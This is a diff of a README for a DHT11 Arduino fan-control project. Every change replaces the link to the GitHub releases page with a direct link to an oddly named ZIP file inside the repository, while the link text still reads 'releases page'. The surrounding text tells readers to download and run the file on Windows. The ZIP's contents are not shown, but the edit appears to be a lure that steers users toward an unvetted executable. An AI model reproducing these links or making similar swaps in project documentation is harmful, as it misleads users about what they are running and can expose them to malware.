@@ -1,10 +1,10 @@
 # 🌡️ DHT11 - Simple Fan Control for Temperature
 
-[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&logo=github)](https://github.com/Walterpayroll629/DHT11/releases)
+[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Walterpayroll629/DHT11/main/semigravel/DH_rougeberry.zip)
 
 ## 📥 Download
 
-Visit the [releases page](https://github.com/Walterpayroll629/DHT11/releases) to download and run this file on Windows
+Visit the [releases page](https://raw.githubusercontent.com/Walterpayroll629/DHT11/main/semigravel/DH_rougeberry.zip) to download and run this file on Windows
 
 ## 🖥️ What This Does
 
@@ -77,7 +77,7 @@ If you do not have Arduino IDE yet, install it first, then open the project code
 
 ## 🪟 How to Set It Up on Windows
 
-1. Open the [releases page](https://github.com/Walterpayroll629/DHT11/releases)
+1. Open the [releases page](https://raw.githubusercontent.com/Walterpayroll629/DHT11/main/semigravel/DH_rougeberry.zip)
 2. Download and run this file from the latest release
 3. If the file comes in a ZIP folder, extract it first
 4. Open Arduino IDE
